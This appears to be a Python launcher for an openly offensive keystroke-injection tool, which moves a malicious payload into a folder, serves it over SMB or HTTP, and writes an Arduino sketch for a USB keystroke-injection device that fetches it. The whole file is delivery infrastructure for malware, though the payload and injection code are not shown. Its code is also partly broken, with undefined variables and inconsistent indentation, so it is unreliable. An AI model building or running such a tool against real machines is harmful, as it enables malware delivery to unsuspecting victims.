#!/bin/python
#coding: utf-8
#===============================================================================#
#										#
#				!! Created by Sharon !!				#
#			Follow me on Instagram:					#
#				https://www.instagram.com/zero.overflow/	#
#			My GitHub:						#
#				https://www.github.com/zer0overflow/		#
#										#
#################################################################################

import sys, os, threading
sys.path.insert(1, 'modules/')
from impacket import smbserver
import time
global reset, header, blue, pos, info, neg
reset = '\033[32;0;0m'
header = '\033[95m'
blue = '\033[94m'
pos = '\033[92m'
info = '\033[93m'
neg = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
global payload_check
payload_check = False

def banner():
        os.system('clear')
        print('\n\n\033[1;31;5m' + open('grafitti.txt', 'r').read()) + reset
        print(header + blue + " \t\t\t  -=[ Written by zer0overflow ]=-" + reset)


def usage():
	banner()
	print("""
	Usage:
		python %s [HOST] [PORT] [PAYLOAD] [OUTPUT FILE] [format]
""" % sys.argv[0])

def clean():
    print(neg + ' [!] Cleaning...')
    if os.path.isdir('server/'):
        os.chdir('server/')
        for files in os.listdir('./'):
            os.remove(files)
        os.chdir('..')

def create_ino(code):
        f = open('keystroke_inject.ino', 'w')
        cc = 'keystroke_inject.ino'
        f.write(code)
        f.close()
        print(pos + " File saved to %s" % cc)
        print(pos + " Open Arduino >> File >> Open >> %s" % cc)

def start_server(type_):
                if 'server' in os.listdir(os.getcwd()):
                        pass
                else:
                        try:
                                os.mkdir('server')
                        except Exception as e:
                                print(info + ' Error %s continuing...' % e)
                                pass
                #os.system('mv %s server/' % mal)
                os.rename(mal, 'server/' + mal)
                os.chdir('server/')
                if type_ == 'SMB':
                        create_ino(smbcode)
                        print(info + ' Starting the Samba Server...')
                        server = smbserver.SimpleSMBServer()
			server.addShare('MAL', os.getcwd())
                        try:
                                server.start()
                        except Exception as e:
                                print(neg + ' Error! %s ' % e)
                else:
                        create_ino(httpcode)
                        os.system('python -m SimpleHTTPServer 3456')

def main():
    clean()
    banner()
    modules = []
    try:
        fils = os.listdir('modules/')
        for i in fils:
	    if i.endswith('py'):
            	modules.append(i[:-3])
    except Exception as e:
        exit( neg + ' [-] Error %s' % e)
    print(info + " [!] Loading modules..." + reset)
    for module in modules:
        exec('import %s' % module)
    print(blue + " [+] Done... listing modules\n" + reset)
    print("\t  │")
    for i in range(len(modules)):
        if modules[-1] == modules[i]:
            print('\t  └‣ ' + header + str(i + 1) + ') ' + modules[i] + '\n\n'+reset)
            break
        print( '\t  ├‣ ' + header + str(i + 1) + ') ' + modules[i] + reset )
    module = modules[input(info + ' [*] Enter the type of delivery: ' + reset) - 1]
    if 'server' not in os.listdir(os.getcwd()):
            os.mkdir('server')
    exec('import %s; %s.execute()' % (module, module))
    
if __name__ == '__main__':
	main()
